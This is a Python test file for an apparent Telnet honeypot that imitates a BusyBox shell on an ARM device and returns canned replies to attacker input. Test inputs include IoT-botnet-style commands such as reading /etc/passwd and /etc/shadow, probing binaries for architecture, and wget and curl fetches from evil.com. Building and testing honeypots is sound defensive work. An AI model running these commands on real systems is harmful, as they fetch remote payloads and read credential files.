"""Tests for backend/services/protocols/telnet_honeypot.py"""

from services.protocols.telnet_honeypot import (
    TelnetHoneypot,
    _COMMAND_RESPONSES,
    _ARM_ELF_HEADER,
    _interpret_escapes,
)


def _make_telnet():
    return TelnetHoneypot(port=0)


class TestExecuteSingle:
    def test_known_command(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("whoami")
        assert output == "admin"
        assert ok is True

    def test_id_command(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("id")
        assert "root" in output
        assert ok is True

    def test_uname_a(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("uname -a")
        assert "Linux" in output
        assert "armv7l" in output

    def test_unknown_command(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("nonexistent_cmd")
        assert "not found" in output
        assert ok is False

    def test_unknown_path_command(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("./payload")
        assert "No such file or directory" in output
        assert ok is False

    def test_silent_commands(self):
        hp = _make_telnet()
        for cmd in ("cd /tmp", "rm -f foo", "mkdir test", "touch file"):
            output, ok = hp._execute_single(cmd)
            assert output == ""
            assert ok is True

    def test_busybox_prefix_stripped(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("/bin/busybox whoami")
        assert output == "admin"
        assert ok is True

    def test_busybox_usr_prefix(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("/usr/bin/busybox ls")
        assert ok is True
        assert output == "bin  etc  log  tmp  www"

    def test_pipe_executes_first_command(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("whoami | grep admin")
        assert output == "admin"

    def test_redirect_creates_file_silently(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("> /tmp/test")
        assert output == ""
        assert ok is True

    def test_cat_known_file(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("cat /etc/passwd")
        assert "root:x:0:0" in output
        assert ok is True

    def test_cat_unknown_file(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("cat /etc/shadow")
        assert "No such file or directory" in output
        assert ok is False

    def test_chmod_missing_file(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("chmod +x /tmp/payload")
        assert "cannot access" in output
        assert ok is False


class TestExecuteLine:
    def test_semicolon_chain(self):
        hp = _make_telnet()
        output = hp._execute_line("whoami; hostname")
        assert "admin" in output
        assert "gateway" in output

    def test_and_chain_both_succeed(self):
        hp = _make_telnet()
        output = hp._execute_line("whoami && hostname")
        assert "admin" in output
        assert "gateway" in output

    def test_and_chain_first_fails(self):
        hp = _make_telnet()
        output = hp._execute_line("nonexistent_cmd && hostname")
        assert "not found" in output
        # hostname should NOT execute because first failed
        assert "gateway" not in output

    def test_or_chain_first_succeeds(self):
        hp = _make_telnet()
        output = hp._execute_line("whoami || hostname")
        assert "admin" in output
        # hostname should NOT execute because first succeeded
        assert "gateway" not in output

    def test_or_chain_first_fails(self):
        hp = _make_telnet()
        output = hp._execute_line("nonexistent_cmd || whoami")
        assert "admin" in output

    def test_empty_line(self):
        hp = _make_telnet()
        assert hp._execute_line("") == ""


class TestHandleEcho:
    def test_simple_text(self):
        result = TelnetHoneypot._handle_echo("echo hello world")
        assert result == "hello world"

    def test_bare_echo(self):
        result = TelnetHoneypot._handle_echo("echo")
        assert result == ""

    def test_quoted_text(self):
        result = TelnetHoneypot._handle_echo('echo "hello world"')
        assert result == "hello world"

    def test_single_quoted_text(self):
        result = TelnetHoneypot._handle_echo("echo 'hello world'")
        assert result == "hello world"

    def test_echo_e_with_hex(self):
        result = TelnetHoneypot._handle_echo("echo -e '\\x41\\x42'")
        assert result == "AB"

    def test_echo_ne_with_newline(self):
        result = TelnetHoneypot._handle_echo("echo -ne '\\n'")
        assert result == "\n"

    def test_echo_no_interpret_without_flag(self):
        result = TelnetHoneypot._handle_echo("echo '\\x41'")
        assert result == "\\x41"


class TestHandlePrintf:
    def test_simple_text(self):
        result = TelnetHoneypot._handle_printf("printf hello")
        assert result == "hello"

    def test_hex_escapes(self):
        result = TelnetHoneypot._handle_printf("printf '\\x41\\x42\\x43'")
        assert result == "ABC"

    def test_newline_escape(self):
        result = TelnetHoneypot._handle_printf("printf '\\n'")
        assert result == "\n"


class TestArchProbe:
    def test_cat_bin_ls(self):
        hp = _make_telnet()
        result = hp._handle_arch_probe("cat /bin/ls")
        assert result is not None
        data, ok = result
        assert ok is True
        assert isinstance(data, bytes)
        assert data[:4] == b"\x7fELF"

    def test_cat_bin_busybox(self):
        hp = _make_telnet()
        result = hp._handle_arch_probe("cat /bin/busybox")
        assert result is not None

    def test_hexdump_bin_ls(self):
        hp = _make_telnet()
        result = hp._handle_arch_probe("hexdump /bin/ls")
        assert result is not None
        data, ok = result
        assert ok is True
        assert "7f45" in data or "457f" in data  # ELF magic in hex

    def test_dd_bin_ls(self):
        hp = _make_telnet()
        result = hp._handle_arch_probe("dd if=/bin/ls bs=52 count=1")
        assert result is not None

    def test_unrelated_command(self):
        hp = _make_telnet()
        assert hp._handle_arch_probe("ls -la") is None


class TestArmElfHeader:
    def test_length_52_bytes(self):
        assert len(_ARM_ELF_HEADER) == 52

    def test_elf_magic(self):
        assert _ARM_ELF_HEADER[:4] == b"\x7fELF"

    def test_32bit_arm(self):
        assert _ARM_ELF_HEADER[4] == 1  # ELFCLASS32
        assert _ARM_ELF_HEADER[5] == 1  # ELFDATA2LSB


class TestInterpretEscapes:
    def test_hex_escapes(self):
        assert _interpret_escapes("\\x41\\x42") == "AB"

    def test_newline(self):
        assert _interpret_escapes("\\n") == "\n"

    def test_tab(self):
        assert _interpret_escapes("\\t") == "\t"

    def test_backslash(self):
        assert _interpret_escapes("\\\\") == "\\"

    def test_no_escapes(self):
        assert _interpret_escapes("hello") == "hello"


class TestDownloadHandler:
    def test_wget_without_url(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("wget")
        assert "BusyBox" in output
        assert ok is True

    def test_wget_with_url(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("wget http://evil.com/payload")
        assert "Connection refused" in output
        assert ok is False

    def test_curl(self):
        hp = _make_telnet()
        output, ok = hp._execute_single("curl http://evil.com")
        assert "Connection refused" in output
        assert ok is False
